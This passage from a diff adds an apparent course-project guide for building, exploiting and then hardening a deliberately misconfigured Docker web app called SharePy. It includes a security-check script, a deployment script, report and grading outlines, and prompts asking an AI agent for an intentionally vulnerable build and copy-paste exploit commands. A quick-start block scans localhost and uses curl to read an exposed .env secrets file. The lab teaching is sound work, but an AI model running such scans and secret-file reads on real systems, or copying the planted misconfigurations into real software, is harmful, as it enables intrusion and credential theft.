+            self.check("M14: Debug Endpoint", True, "Debug endpoint not accessible")
+    
+    def check_m15_strong_jwt_secret(self):
+        """M15: Check JWT secret is strong"""
+        weak_secrets = ["secret", "secret123", "changeme", "admin", "password"]
+        
+        # Check environment or config
+        jwt_secret = os.getenv("JWT_SECRET", "")
+        is_strong = len(jwt_secret) >= 32 and jwt_secret.lower() not in weak_secrets
+        
+        # Also check not hardcoded
+        with open("backend/main.py", "r") as f:
+            content = f.read()
+            not_hardcoded = all(s not in content.lower() for s in weak_secrets)
+        
+        self.check(
+            "M15: Strong JWT Secret",
+            is_strong and not_hardcoded,
+            "JWT secret is strong and not hardcoded"
+        )
+    
+    def print_summary(self):
+        """Print final summary"""
+        print("\n" + "="*60)
+        passed = sum(1 for _, result, _ in self.results if result)
+        total = len(self.results)
+        score = (passed / total) * 100
+        
+        print(f"FINAL SCORE: {passed}/{total} ({score:.1f}%)")
+        
+        if passed == total:
+            print("🎉 ALL SECURITY CHECKS PASSED!")
+            sys.exit(0)
+        else:
+            print("⚠️  SOME CHECKS FAILED - REVIEW ABOVE")
+            sys.exit(1)
+
+if __name__ == "__main__":
+    checker = SecurityChecker()
+    checker.run_all_checks()
+```
+
+### Deployment Script (deploy_secure.sh)
+
+```bash
+#!/bin/bash
+set -e
+
+echo "🔒 SharePy Secure Deployment Script"
+echo "===================================="
+
+# Check prerequisites
+command -v docker >/dev/null 2>&1 || { echo "❌ Docker not installed"; exit 1; }
+command -v docker-compose >/dev/null 2>&1 || { echo "❌ Docker Compose not installed"; exit 1; }
+
+# Check .env exists
+if [ ! -f .env ]; then
+    echo "❌ .env file not found!"
+    echo "Copy .env.example to .env and configure with secure values"
+    exit 1
+fi
+
+# Validate .env has strong secrets
+if grep -q "CHANGE_ME" .env; then
+    echo "❌ .env still contains CHANGE_ME placeholders!"
+    exit 1
+fi
+
+# Stop existing containers
+echo "🛑 Stopping existing containers..."
+docker-compose down
+
+# Build images
+echo "🔨 Building secure images..."
+docker-compose build --no-cache
+
+# Start services
+echo "🚀 Starting secure services..."
+docker-compose up -d
+
+# Wait for services to be ready
+echo "⏳ Waiting for services to be ready..."
+sleep 10
+
+# Run security checks
+echo "🔍 Running security validation..."
+python3 check_security.py
+
+echo "✅ Secure deployment complete!"
+echo "📊 Access application at: https://localhost"
+```
+
+---
+
+## 📋 DELIVERABLES CHECKLIST
+
+### Week 1: Vulnerable System
+- [ ] Complete project structure created
+- [ ] All 15 misconfigurations implemented
+- [ ] Docker Compose with 6-7 services running
+- [ ] Git repository with `vulnerable` branch
+- [ ] Exploitation proofs for all 15 misconfigs
+- [ ] Screenshots of each exploit
+- [ ] Partial Red Team report (exploitation section)
+
+### Week 2: Hardened System
+- [ ] Git branch `secure` created
+- [ ] All 15 vulnerabilities fixed
+- [ ] Hardened docker-compose.yml
+- [ ] Security headers implemented
+- [ ] Internal services isolated
+- [ ] Sensitive files protected
+- [ ] `check_security.py` script written and passing
+- [ ] Before/after scan comparison
+
+### Week 3: Final Deliverables
+- [ ] Complete PDF report (12-18 pages)
+- [ ] Deployment script (deploy_secure.sh)
+- [ ] Demo video (4-6 minutes) or live presentation
+- [ ] Clean Git history with meaningful commits
+- [ ] README with setup instructions
+- [ ] Secure-by-default checklist
+
+---
+
+## 📄 REPORT STRUCTURE (12-18 pages)
+
+### 1. Executive Summary (1 page)
+- Project overview
+- Key findings summary
+- Risk severity breakdown
+
+### 2. Architecture (2 pages)
+- System architecture diagram
+- Technology stack explanation
+- Docker service interaction
+- Network topology
+
+### 3. Threat Model (1-2 pages)
+- Attack surface analysis
+- Threat actors
+- STRIDE analysis
+
+### 4. Vulnerability Analysis (6-8 pages)
+**For EACH of the 15 misconfigurations:**
+- Description
+- OWASP A02 mapping
+- Exploitation steps
+- Screenshots
+- CVE references (if applicable)
+- Real-world examples
+
+### 5. Exploitation Results (1-2 pages)
+- Scan results (nmap, nikto, nuclei)
+- Access gained
+- Data exfiltrated
+- Impact assessment
+
+### 6. Hardening Implementation (2-3 pages)
+**For EACH fix:**
+- Before/after code comparison
+- Configuration changes
+- Security controls implemented
+- Verification method
+
+### 7. Verification & Testing (1 page)
+- Security scan comparison
+- `check_security.py` results
+- Penetration test results
+
+### 8. Secure-by-Default Checklist (1 page)
+- Development best practices
+- Deployment checklist
+- Monitoring recommendations
+
+### 9. Conclusion (0.5 page)
+- Lessons learned
+- Future improvements
+
+### 10. References
+- OWASP documentation
+- CVE databases
+- Security best practices
+
+---
+
+## 🎯 HOW TO USE THIS GUIDE WITH AN AI AGENT
+
+### Step 1: Build Vulnerable Application
+**Prompt:**
+```
+Using the "PHASE 1: BUILD THE VULNERABLE APPLICATION" section from the guide:
+1. Create the complete project structure
+2. Implement the SharePy application with all basic features
+3. Intentionally implement all 15 misconfigurations as specified
+4. Create the docker-compose.yml with exposed services
+5. Ensure the application runs with: docker-compose up
+
+Focus on simplicity and making each misconfiguration clearly exploitable.
+```
+
+### Step 2: Exploit All Misconfigurations
+**Prompt:**
+```
+Using the "PHASE 2: EXPLOIT ALL 15 MISCONFIGURATIONS" section:
+1. For each misconfiguration (M1-M15), provide:
+   - The exact command to exploit it
+   - Expected output/result
+   - Screenshot placeholder text
+2. Create automated scanning scripts using nmap, nikto, gobuster, nuclei
+3. Document the impact of each vulnerability
+
+Provide complete, working exploit commands I can copy-paste.
+```
+
+### Step 3: Build Secure Application
+**Prompt:**
+```
+Using the "PHASE 3: BUILD THE SECURE APPLICATION" section:
+1. Create secure versions of all configuration files
+2. Implement all 15 security fixes
+3. Create the check_security.py validation script
+4. Create the deploy_secure.sh deployment script
+5. Ensure zero vulnerabilities remain
+
+Make sure the secure version passes all security checks.
+```
+
+### Step 4: Generate Report
+**Prompt:**
+```
+Generate a complete security report following the structure in the guide:
+1. Executive summary
+2. Architecture documentation
+3. All 15 vulnerabilities with exploitation proofs
+4. All 15 security fixes
+5. Before/after comparison
+6. Secure deployment checklist
+
+Format as Markdown, ready to convert to PDF.
+```
+
+---
+
+## ⚡ QUICK START COMMANDS
+
+```bash
+# Clone and setup
+git clone <your-repo>
+cd sharepy
+git checkout vulnerable
+
+# Build vulnerable version
+docker-compose up -d
+
+# Exploit it
+nmap -p- localhost
+nikto -h http://localhost
+curl http://localhost/.env
+
+# Switch to secure
+git checkout secure
+
+# Deploy secure version
+./deploy_secure.sh
+
+# Verify security
+python3 check_security.py
+```
+
+---
+
+## 🎓 GRADING CRITERIA
+
+- **Implementation (40%)**
+  - All 15 misconfigs correctly implemented
+  - Working exploitation proofs
+  - Complete security fixes
+
+- **Documentation (30%)**
+  - Clear report structure
+  - Professional screenshots
+  - Detailed explanations
+
+- **Technical Quality (20%)**
+  - Clean code
+  - Proper Docker configuration
+  - Automated validation
+
+- **Presentation (10%)**
+  - Demo quality
+  - Defense readiness
+  - Question handling
+
+---
+
+## 💡 PRO TIPS
+
+1. **Screenshot Everything** - Every exploit, every scan result
+2. **Git Commits Matter** - Clear history shows your process
+3. **Test Before Demo** - Run full deployment multiple times
+4. **Know Your Code** - Teacher will ask specific questions
+5. **Security First** - Show you understand WHY each fix matters
+
+---
+
+## 🚨 COMMON PITFALLS TO AVOID
+
+❌ Overcomplicated application features
+❌ Missing exploitation proofs
+❌ Weak documentation
+❌ Docker containers that don't start
+❌ Security checks that don't actually validate fixes
+❌ No before/after comparison
+
+✅ Simple, focused application
+✅ Every vulnerability exploited with proof
+✅ Professional, complete documentation
+✅ One-command deployment
+✅ Automated validation
+✅ Clear security improvements demonstrated
